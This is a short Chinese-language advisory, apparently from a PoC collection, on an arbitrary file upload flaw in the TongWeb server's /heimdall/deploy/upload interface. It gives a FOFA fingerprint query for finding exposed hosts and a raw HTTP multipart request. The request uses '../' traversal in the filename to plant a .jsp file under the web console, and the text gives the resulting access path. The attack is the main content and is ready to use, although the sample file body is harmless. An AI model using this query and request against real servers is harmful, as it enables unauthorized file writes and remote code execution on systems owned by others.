# 东方通upload接口存在任意文件上传漏洞

东方通upload接口存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
header="TongWeb Server" || banner="Server: TongWeb Server"
```

## poc

```javascript
POST /heimdall/deploy/upload?method=upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Connection: keep-alive
Content-Length: 396
Accept: */*
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs

------WebKitFormBoundary8UaANmWAgM4BqBSsContent-Disposition: form-data; name="file"; filename="../../applications/console/css/12462332j12.jsp"

123456
------WebKitFormBoundary8UaANmWAgM4BqBSs--
```

文件路径`/console/css/12462332j12.jsp`

![3defeacdea561cbf5f9437781d48707d](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409251124922.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/5YXeW7rlQ17Kz-6MvrzzKA